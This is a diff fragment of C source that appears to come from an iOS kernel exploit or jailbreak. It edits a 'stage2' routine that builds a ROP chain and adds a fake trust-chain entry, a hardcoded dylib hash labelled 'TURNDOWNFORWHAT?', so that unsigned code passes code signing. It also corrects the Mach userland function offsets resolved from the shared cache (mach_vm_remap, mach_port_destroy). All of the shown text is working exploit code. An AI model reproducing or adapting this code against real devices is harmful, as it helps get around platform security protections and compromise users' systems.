@@ -954,7 +954,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 1;
-	hash_t my_dylib_hash = {0xc1,0x8c,0x92,0x63,0x5e,0x06,0x14,0xc8,0x3e,0x36,0x7e,0x4f,0xd4,0x0a,0xc9,0xeb,0x8a,0x9f,0xcd,0x39};
+	hash_t my_dylib_hash = {0xe3,0x12,0xb6,0x03,0x41,0x94,0x52,0x17,0xeb,0x61,0x41,0xea,0xf0,0x42,0xfc,0x33,0xd3,0x85,0xd7,0xb4};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
@@ -1587,7 +1587,7 @@ _STRUCT_ARM_THREAD_STATE64
 		struct {
 			void (*write) (int fd,void * buf,uint64_t size);
 			kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
-			kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t init_port_count);
+			kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t * init_port_count);
 			mach_port_name_t (*mach_task_self) ();
 			kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
 			kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
@@ -1631,8 +1631,8 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->userland_funcs.IOConnectTrap6 = get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_ports_lookup = get_addr_from_name(offsets,"mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_task_self = get_addr_from_name(offsets,"mach_task_self") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_vm_remap = get_addr_from_name(offsets,"mach_vm_remap") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_port_destroy = get_addr_from_name(offsets,"mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr; // this is wrong atm but I can't find _destory FIXME
+	lib_offsets->userland_funcs.mach_vm_remap = offsets->raw_mach_vm_remap_call - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.mach_port_destroy = get_addr_from_name(offsets,"mach_port_destroy") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_port_deallocate = get_addr_from_name(offsets,"mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_port_allocate = get_addr_from_name(offsets,"mach_port_allocate") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_port_insert_right = get_addr_from_name(offsets,"mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr;
